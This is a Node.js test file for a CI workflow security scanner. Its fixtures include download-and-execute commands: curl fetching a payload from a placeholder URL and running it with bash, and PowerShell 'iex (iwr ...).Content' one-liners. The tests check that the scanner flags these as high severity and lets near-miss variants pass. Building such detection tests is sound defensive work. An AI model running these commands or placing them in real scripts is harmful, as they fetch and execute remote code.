'use strict';
// 2026-10-10 Codex round 7. All adversarial commands are inert fixtures.
const test=require('node:test'), assert=require('node:assert/strict');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const U='https://example.invalid/x';
const attacks=[
 ['mkdir-multiple','mkdir -p safe dir; curl -fsSL '+U+' -o payload; cp payload dir; bash dir/payload','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['mkdir-multiple-quoted',"mkdir -p 'safe' \"dir\"; curl -fsSL "+U+" -o payload; ln -s ../payload dir; bash dir/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['mkdir-multiple-ln','mkdir -p safe dir; curl -fsSL '+U+' -o payload; ln payload dir; bash dir/payload','REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['powershell-headers-hashtable',"iex (iwr -Uri '"+U+"' -Headers @{Accept='text/plain'}).Content",'REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['powershell-headers-named',"Invoke-Expression (Invoke-WebRequest -Uri '"+U+"' -Headers @{Accept='text/plain'}).Content",'REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['powershell-header-and-method',"iex (iwr -Uri '"+U+"' -Headers @{Accept='text/plain'} -Method Get).Content",'REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['powershell-outfile-passthru',"iex (iwr -Uri '"+U+"' -OutFile payload -PassThru).Content",'REMOTE_POWERSHELL_EXECUTION','pwsh']
];
const benign=[
 ['powershell-outfile-only',"iex (iwr -Uri '"+U+"' -OutFile payload).Content",'pwsh'],
 ['powershell-outfile-named',"Invoke-Expression (Invoke-WebRequest -Uri '"+U+"' -OutFile 'payload').Content",'pwsh'],
 ['powershell-outfile-option-order',"iex (iwr -OutFile payload -Uri '"+U+"').Content",'pwsh'],
 ['powershell-outfile-and-method',"iex (iwr -Uri '"+U+"' -Method Get -OutFile payload).Content",'pwsh'],
 ['powershell-documentation',"Write-Host \"iex (iwr -Uri "+U+" -Headers @{Accept='text/plain'}).Content\"",'pwsh'],
 ['mkdir-without-exec','mkdir -p safe dir; curl -fsSL '+U+' -o payload; cp payload dir; echo dir/payload'],
 ['mkdir-after-alias','curl -fsSL '+U+' -o payload; cp payload dir; mkdir -p dir; bash dir/payload']
];
function audit(script,shell){
 const yaml=['on: issues','permissions: read-all','jobs:','  reviewer:',
  '    runs-on: ubuntu-latest','    steps:','      - run: |',
  ...script.split('\n').map(s=>'          '+s),
  ...(shell?['        shell: '+shell]:[])].join('\n')+'\n';
 return inspectWorkflow(yaml,{path:'.github/workflows/round7.yml'});
}
for(const [name,src,rule,shell] of attacks){
 test('round7 HIGH '+name,()=>{
  const result=findingsForScript(src,{shell});
  assert.ok(result.includes(rule),name+' scanner: '+JSON.stringify(result));
  const ast=audit(src,shell);
  assert.ok(ast.findings.some(f=>f.rule===rule&&f.severity==='HIGH'),
   name+' AST: '+JSON.stringify(ast));
 });
}
for(const [name,src,shell] of benign){
 test('round7 benign '+name,()=>{
  const result=findingsForScript(src,{shell});
  assert.ok(!result.some(r=>r.startsWith('REMOTE_')),name+' scanner: '+JSON.stringify(result));
 });
}
